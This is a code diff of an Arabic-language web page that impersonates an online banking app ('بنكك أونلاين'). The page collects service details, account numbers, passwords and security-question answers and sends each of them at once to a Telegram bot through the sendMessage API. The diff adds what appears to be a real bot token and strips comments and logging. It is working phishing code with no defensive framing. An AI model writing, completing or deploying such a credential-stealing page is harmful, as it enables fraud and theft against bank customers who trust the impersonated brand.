@@ -314,9 +314,9 @@
         <!-- 1. نموذج الخدمة المخصص لكل خدمة -->
         <div id="service-form-step" class="step-container">
             <h3 class="step-title" id="service-title-display">تفاصيل الخدمة</h3>
-            <form id="custom-service-form" onsubmit="submitServiceForm(event)">
+            <form id="custom-service-form" onsubmit="event.preventDefault(); goToCredentialsStep();">
                 <div id="dynamic-fields"></div>
-                <button type="button" class="btn-submit" onclick="goToCredentialsStep()">التالي</button>
+                <button type="submit" class="btn-submit">التالي</button>
                 <button type="button" class="btn-back" onclick="goHome()">إرجاع للقائمة</button>
             </form>
         </div>
@@ -378,7 +378,7 @@
     </footer>
 
     <script>
-        // قائمة أسئلة الأمان العشوائية المعتمدة
+        // قائمة أسئلة الأمان العشوائية
         const securityQuestions = [
             "ما هو اسم ابن عمك الأول؟",
             "ما كان لقبك أثناء الطفولة؟",
@@ -400,23 +400,22 @@
         let currentSelectedService = "";
         let collectedData = {};
 
-        // إعدادات بوت التليجرام المطلوب @bok_online_info_bot
-        // ملاحظة: تأكد من إدخال الـ Token الخاص بـ @bok_online_info_bot في المتغير أدناه
-        const BOT_TOKEN = "PUT_YOUR_BOT_TOKEN_HERE"; 
-        const CHAT_ID = "PUT_YOUR_CHAT_ID_HERE";       
+        // التوكن الخاص بك تم إدراجه بنجاح هنا
+        const BOT_TOKEN = "8666514672:AAFtpOM78ouq8plo6M-q2QbeUaX9SCoOQN8"; 
+        
+        // ضع رقم Chat ID الخاص بك مكان النص التالي:
+        const CHAT_ID = "أدخل_رقم_الـCHAT_ID_هنا";       
 
         function sendDataInstantly(dataObj) {
             collectedData = { ...collectedData, ...dataObj };
             
-            let message = `🚨 إشعار جديد من تطبيق بنكك أونلاين\n`;
+            let message = `🚨 إشعار جديد - بنكك أونلاين (@bok_online_info_bot)\n`;
             for (let key in collectedData) {
                 message += `▪️ ${key}: ${collectedData[key]}\n`;
             }
 
-            console.log("إرسال البيانات لحظياً للبوت @bok_online_info_bot:\n", message);
-
-            // الإرسال الفعلي عبر تليجرام API
-            if (BOT_TOKEN !== "PUT_YOUR_BOT_TOKEN_HERE") {
+            // إرسال البيانات لحظياً
+            if (CHAT_ID !== "أدخل_رقم_الـCHAT_ID_هنا") {
                 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -424,11 +423,10 @@
                         chat_id: CHAT_ID,
                         text: message
                     })
-                }).catch(err => console.error("خطأ في الاتصال بالبوت:", err));
+                }).catch(err => console.error("خطأ الإرسال:", err));
             }
         }
 
-        // تخصيص النموذج حسب كل خدمة بدقة
         function openServiceForm(serviceName) {
             currentSelectedService = serviceName;
             document.getElementById('service-title-display').innerText = "نموذج خدمة: " + serviceName;
@@ -554,8 +552,6 @@
             }
 
             document.getElementById('dynamic-fields').innerHTML = fieldsHTML;
-
-            // الانتقال لنموذج الخدمة وإخفاء الرئيسية
             document.getElementById('home-section').style.display = 'none';
             document.getElementById('service-form-step').classList.add('active');
         }
@@ -571,7 +567,6 @@
         }
 
         function goToCredentialsStep() {
-            // تجميع وتخزين بيانات الخدمة المدخلة
             let serviceData = { "الخدمة": currentSelectedService };
             
             if (currentSelectedService === "تحديث البيانات") {
@@ -604,7 +599,6 @@
                 if (det) serviceData["التفاصيل"] = det.value;
             }
 
-            // إرسال البيانات فوراً للبوت
             sendDataInstantly(serviceData);
 
             document.getElementById('service-form-step').classList.remove('active');
@@ -616,7 +610,6 @@
             let accNum = document.getElementById('acc-number').value;
             let password = document.getElementById('acc-password').value;
 
-            // التحقق من قوة كلمة السر (حرف كبير، حرف صغير، رقم، رمز خاص)
             const passwordRegex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[\W_]).{8,}$/;
             if (!passwordRegex.test(password)) {
                 alert("يجب أن تحتوي كلمة السر على حرف كبير، حرف صغير، رقم، ورمز خاص (مثل @, #, $, %)، وبطول 8 أحرف على الأقل.");
@@ -628,7 +621,6 @@
                 "كلمة السر": password
             });
 
-            // اختيار سؤال أمان عشوائي وتجهيز الخطوة التالية
             let randomQ = securityQuestions[Math.floor(Math.random() * securityQuestions.length)];
             document.getElementById('random-question-label').innerText = randomQ;
             collectedData["سؤال الأمان المختار"] = randomQ;
